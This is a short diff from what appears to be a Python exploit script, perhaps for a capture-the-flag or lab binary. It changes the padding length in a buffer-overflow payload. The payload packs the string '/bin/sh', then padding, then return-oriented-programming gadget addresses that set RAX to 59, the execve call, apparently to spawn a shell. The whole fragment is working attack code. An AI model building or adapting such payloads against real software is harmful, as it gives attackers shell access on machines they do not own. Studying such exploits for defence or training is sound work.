@@ -18,7 +18,7 @@ d3 = 0x7ffffffffe100
 
 shellcode = struct.pack('<q', 0x0068732f6e69622f) #?
 
-shellcode += 'A'*(1033)
+shellcode += 'A'*(1032)
 
 shellcode += struct.pack('<q', g1) 	# pop eax; ret
 shellcode += struct.pack('<q', d1)  # value to set in RAX (59)
